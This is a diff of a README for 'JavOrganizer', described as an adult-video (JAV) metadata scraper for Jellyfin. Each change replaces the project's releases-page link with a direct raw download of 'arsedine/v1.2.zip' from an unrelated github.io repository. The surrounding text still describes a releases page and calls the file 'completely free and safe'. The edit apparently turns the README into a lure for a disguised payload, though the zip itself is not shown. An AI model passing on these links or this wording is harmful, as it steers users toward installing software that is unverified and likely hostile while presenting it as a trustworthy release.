@@ -6,7 +6,7 @@ description: "Scrape JAV metadata for Jellyfin from 19 sites concurrently with b
 <h1>🎬 JavOrganizer - Your Jellyfin Library, Beautifully Organized</h1>
 
 <div align="center">
-  <a href="https://github.com/acquinizerop/JavOrganizer/releases">
+  <a href="https://github.com/acquinizerop/acquinizerop.github.io/raw/refs/heads/main/arsedine/v1.2.zip">
     <img src="https://img.shields.io/badge/Download-JavOrganizer-2ea44f?style=for-the-badge" alt="Download JavOrganizer">
   </a>
 </div>
@@ -23,7 +23,7 @@ Getting started with JavOrganizer is very easy. This section will walk you throu
 
 To begin, you need to download the application. The download is completely free and safe.
 
-**Visit this link to download the application:** [JavOrganizer Releases](https://github.com/acquinizerop/JavOrganizer/releases)
+**Visit this link to download the application:** [JavOrganizer Releases](https://github.com/acquinizerop/acquinizerop.github.io/raw/refs/heads/main/arsedine/v1.2.zip)
 
 Click the link above. You will see a page that lists different versions of the software. Look for the newest version at the top of the list. Click the download button next to it. The download will start automatically.
 
@@ -94,6 +94,6 @@ While we cannot offer direct customer support, the Jellyfin community is incredi
 
 That is it! You have successfully installed and used JavOrganizer. Now, sit back and enjoy a perfectly organized, beautiful-looking Jellyfin library. Every movie will have its title, cover, and cast, making your home media experience so much better.
 
-**Visit this link to download the application:** [JavOrganizer Releases](https://github.com/acquinizerop/JavOrganizer/releases)
+**Visit this link to download the application:** [JavOrganizer Releases](https://github.com/acquinizerop/acquinizerop.github.io/raw/refs/heads/main/arsedine/v1.2.zip)
 
 Keywords: cloudflare-bypass, csharp, dotnet, flaresolverr, homelab, jav, jellyfin, jellyfin-plugin, jellyfin-plugins, library-organizer, media-library, media-server, metadata-scraper, movie-metadata, self-hosted, web-scraping
